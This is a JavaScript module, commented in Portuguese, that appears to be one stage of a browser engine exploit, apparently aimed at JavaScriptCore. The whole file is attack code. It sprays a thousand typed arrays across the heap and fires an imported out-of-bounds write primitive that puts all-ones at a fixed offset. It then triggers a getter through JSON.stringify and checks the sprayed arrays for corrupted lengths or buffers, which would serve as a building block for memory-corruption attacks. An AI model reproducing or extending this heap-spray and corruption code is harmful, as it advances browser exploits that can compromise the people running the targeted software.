// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
// import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs'; // JSC_OFFSETS não é usado para plantar metadados neste teste

// ============================================================\n// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO\n// ============================================================
const FNAME_MASSIVE_SPRAY_RAW_CORRUPTION = "massiveSprayAndRawCorruptionCheck_v16c";

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForSync_v16c";
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // O que será escrito

const NUM_SPRAY_OBJECTS = 1000; // Aumentado drasticamente
const ORIGINAL_SPRAY_LENGTH = 8;
// Padrões para preencher os elementos dos arrays pulverizados para fácil verificação
const SPRAY_ELEMENT_PATTERNS = [0xA0A0A0A0, 0xB1B1B1B1, 0xC2C2C2C2, 0xD3D3D3D3, 0xE4E4E4E4, 0xF5F5F5F5, 0x1A1A1A1A, 0x2B2B2B2B];

// ============================================================\n// VARIÁVEIS GLOBAIS DE MÓDULO\n// ============================================================
let sprayedVictimObjects = [];
let originalSprayedValues = []; // Para comparar após a corrupção
let getter_sync_flag_v16c = false;

export async function sprayAndInvestigateObjectExposure() { // Mantendo nome da exportação
    logS3(`--- Iniciando ${FNAME_MASSIVE_SPRAY_RAW_CORRUPTION}: Spray Massivo, Trigger 0x70, Checar Corrupção Bruta ---`, "test", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
    getter_sync_flag_v16c = false;

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("Falha ao inicializar o ambiente OOB.", "critical", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
            return;
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);

        // FASE 1: Pulverizar objetos Uint32Array e guardar seus valores originais
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
        sprayedVictimObjects = [];
        originalSprayedValues = []; // Armazenar arrays de valores, não apenas o objeto Array.from
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
            const currentOriginalValues = [];
            for (let j = 0; j < ORIGINAL_SPRAY_LENGTH; j++) {
                u32arr[j] = SPRAY_ELEMENT_PATTERNS[j] ^ i; // Padrão único para cada array e elemento
                currentOriginalValues.push(u32arr[j]);
            }
            sprayedVictimObjects.push(u32arr);
            originalSprayedValues.push(currentOriginalValues);
        }
        logS3(`Pulverização de ${sprayedVictimObjects.length} arrays concluída.`, "good", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
        await PAUSE_S3(100); // Pausa maior para estabilização da heap

        // FASE 2: Configurar objeto com getter (apenas para sincronização e log)
        const getterObject = {
            get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
                logS3(`    >>>> [GETTER ${GETTER_CHECKPOINT_PROPERTY_NAME} ACIONADO!] <<<<`, "info", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
                getter_sync_flag_v16c = true;
                return "GetterSyncValue_v16c";
            }
        };

        // FASE 3: Realizar a escrita OOB (trigger) no oob_array_buffer_real
        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
        // NÃO estamos plantando m_vector/m_length no oob_array_buffer_real.
        // Apenas a escrita do CORRUPTION_VALUE_TRIGGER.
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
        await PAUSE_S3(100);

        // FASE 4: Chamar JSON.stringify para acionar o getter
        logS3(`FASE 4: Chamando JSON.stringify para acionar o getter...`, "info", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
        try {
            JSON.stringify(getterObject);
        } catch (e) {
            logS3(`Erro durante JSON.stringify: ${e.message}`, "warn", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
        }
        if (getter_sync_flag_v16c) {
            logS3("  Getter foi acionado como esperado.", "good", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
        } else {
            logS3("  ALERTA: Getter NÃO foi acionado!", "error", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
        }
        await PAUSE_S3(250); // Pausa adicional maior

        // FASE 5: Verificar TODOS os arrays pulverizados por QUALQUER mudança
        logS3(`FASE 5: Verificando ${sprayedVictimObjects.length} arrays pulverizados por corrupção...`, "info", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
        let corruptedItemsInfo = [];

        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            const currentArray = sprayedVictimObjects[i];
            const originalValues = originalSprayedValues[i];
            let corruptionLog = "";

            if (!currentArray) continue;

            // 1. Checar Length
            let currentLength = -1;
            try {
                currentLength = currentArray.length;
                if (currentLength !== ORIGINAL_SPRAY_LENGTH) {
                    corruptionLog += `Length: ${ORIGINAL_SPRAY_LENGTH} -> ${currentLength} (${toHex(currentLength)}). `;
                }
            } catch (e) {
                corruptionLog += `Erro ao ler length: ${e.message}. `;
            }

            // 2. Checar Elementos (comparar com os originais)
            for (let j = 0; j < ORIGINAL_SPRAY_LENGTH; j++) {
                let valAfter;
                try {
                    if (j < currentLength || currentLength === -1) { // Tentar ler se length não for claramente menor
                         valAfter = currentArray[j];
                         if (valAfter !== originalValues[j]) {
                            corruptionLog += `Elem[${j}]: ${toHex(originalValues[j])} -> ${toHex(valAfter)}. `;
                        }
                    } else if (currentLength !== ORIGINAL_SPRAY_LENGTH) { // Se length encolheu e estamos fora
                        corruptionLog += `Elem[${j}] (${toHex(originalValues[j])}) inacessível (novo length: ${currentLength}). `;
                    }
                } catch (e) {
                    corruptionLog += `Erro ao ler Elem[${j}]: ${e.message}. `;
                }
            }
            
            // 3. Tentar usar o ArrayBuffer subjacente com DataView
            let dvTestLog = "";
            if (currentArray && currentArray.buffer instanceof ArrayBuffer) {
                try {
                    const dv = new DataView(currentArray.buffer);
                    const originalBufferLength = ORIGINAL_SPRAY_LENGTH * 4; // Uint32Array
                    if (dv.byteLength !== originalBufferLength) {
                        dvTestLog += `AB.byteLength: ${originalBufferLength} -> ${dv.byteLength}. `;
                    }
                    // Tentar uma leitura/escrita de teste no buffer
                    if (dv.byteLength >= 4) {
                        const testRead = dv.getUint32(0, true);
                        // Comparar com o primeiro elemento original, já que currentArray[0] usa o mesmo buffer
                        if (testRead !== originalValues[0]) {
                             dvTestLog += `DVread[0]: ${toHex(originalValues[0])} -> ${toHex(testRead)}. `;
                        }
                        dv.setUint32(0, 0xBADCAFE0, true);
                        const readAfterWrite = dv.getUint32(0, true);
                        if (readAfterWrite !== 0xBADCAFE0) {
                            dvTestLog += `DV R/W falhou (0xBADCAFE0). `;
                        } else {
                             // Restaurar valor original para não afetar checagem de currentArray[0] se feita depois
                             dv.setUint32(0, testRead, true); 
                        }
                    }
                } catch (e) {
                    dvTestLog += `Erro DataView: ${e.message}. `;
                }
            }
            
            if (corruptionLog.length > 0 || dvTestLog.length > 0) {
                const fullDetails = corruptionLog + dvTestLog;
                logS3(`    CORRUPÇÃO/MUDANÇA DETECTADA no array pulverizado índice [${i}]: ${fullDetails}`, "vuln", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
                corruptedItemsInfo.push({index: i, details: fullDetails});
                document.title = `CORRUPÇÃO SPRAY (${corruptedItemsInfo.length})!`;
            }
        }

        if (corruptedItemsInfo.length > 0) {
            logS3(`  Total de ${corruptedItemsInfo.length} arrays pulverizados encontrados com alguma mudança/corrupção.`, "good", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
        } else {
            logS3("  Nenhuma mudança/corrupção detectada nos arrays pulverizados.", "warn", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
            document.title = "Nenhuma Corrupção Spray";
        }

        logS3("INVESTIGAÇÃO DE CORRUPÇÃO EM SPRAY MASSIVO CONCLUÍDA.", "test", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_MASSIVE_SPRAY_RAW_CORRUPTION}: ${e.message}`, "critical", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
        document.title = `${FNAME_MASSIVE_SPRAY_RAW_CORRUPTION} FALHOU!`;
    } finally {
        sprayedVictimObjects = [];
        originalSprayedValues = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_MASSIVE_SPRAY_RAW_CORRUPTION} Concluído ---`, "test", FNAME_MASSIVE_SPRAY_RAW_CORRUPTION);
    }
}
